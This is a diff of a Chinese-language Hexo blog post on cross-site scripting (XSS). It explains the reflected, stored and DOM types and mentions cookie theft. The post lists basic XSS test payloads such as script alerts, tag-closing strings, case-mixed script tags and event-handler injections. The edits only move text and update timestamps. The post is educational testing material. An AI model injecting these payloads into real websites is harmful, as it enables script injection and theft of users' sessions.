@@ -15,19 +15,19 @@
 
 
 
-<meta name="description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。javascript可以用来获取用户的">
+<meta name="description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。">
 <meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS">
 <meta property="og:url" content="http://yoursite.com/2017/04/10/XSS/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。javascript可以用来获取用户的">
+<meta property="og:description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。">
 <meta property="og:image" content="http://i.imgur.com/IaYq4Ao.png">
 <meta property="og:image" content="http://i.imgur.com/d67sv4O.png">
-<meta property="og:updated_time" content="2017-04-10T08:35:42.830Z">
+<meta property="og:updated_time" content="2017-04-10T09:55:25.935Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS">
-<meta name="twitter:description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。javascript可以用来获取用户的">
+<meta name="twitter:description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。">
 <meta name="twitter:image" content="http://i.imgur.com/IaYq4Ao.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -296,7 +296,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。<br>反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL<br>存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。<br>DOM型：没怎么了解，后续了解了再补充。<br>javascript可以用来获取用户的Cookie、改变页面内容\URL跳转等。<br><a id="more"></a><br>Xss测试语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div><div class="line"><span class="string">"/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"</span>（闭合Input标签）</div><div class="line">‘”()%26%25&lt;acx&gt;&lt;ScRiPt &gt;alert(9528)&lt;/ScRiPt&gt;（大小写绕过）</div><div class="line"><span class="string">" onmouseover=alert(document.domain) align="</span>left（需移动鼠标）</div><div class="line"> “onclick=”alert(‘1’)      （需要点击框才弹）</div><div class="line"> &lt;img src=x onerror=alert(‘1’)&gt; </div><div class="line">&lt;body onload=alert(‘XSS’)&gt;</div><div class="line">...</div></pre></td></tr></table></figure></p>
+        <p>Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。<br>反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL<br>存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。<br>DOM型：没怎么了解，后续了解了再补充。<br><a id="more"></a><br>javascript可以用来获取用户的Cookie、改变页面内容\URL跳转等。<br>Xss测试语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div><div class="line"><span class="string">"/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"</span>（闭合Input标签）</div><div class="line">‘”()%26%25&lt;acx&gt;&lt;ScRiPt &gt;alert(9528)&lt;/ScRiPt&gt;（大小写绕过）</div><div class="line"><span class="string">" onmouseover=alert(document.domain) align="</span>left（需移动鼠标）</div><div class="line"> “onclick=”alert(‘1’)      （需要点击框才弹）</div><div class="line"> &lt;img src=x onerror=alert(‘1’)&gt; </div><div class="line">&lt;body onload=alert(‘XSS’)&gt;</div><div class="line">...</div></pre></td></tr></table></figure></p>
 <hr>
 <p>XSS例子:<br><img src="http://i.imgur.com/IaYq4Ao.png" alt=""><br>ARRAY_KEY_EXISTS():判断函数，如果name变量有值&amp;&amp;（与）不为空，则输出 “  Hello+&amp;_GET[‘name’]  “。<br><strong>思路：无过滤，直接XSS代码可执行。</strong></p>
 <hr>
@@ -323,7 +323,7 @@
         <p><span>本文标题:</span><a href="/2017/04/10/XSS/">XSS</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mark</a></p>
         <p><span>发布时间:</span>2017-04-10, 16:11:39</p>
-        <p><span>最后更新:</span>2017-04-10, 16:35:42</p>
+        <p><span>最后更新:</span>2017-04-10, 17:55:25</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/04/10/XSS/" title="XSS">http://yoursite.com/2017/04/10/XSS/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/10/XSS/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
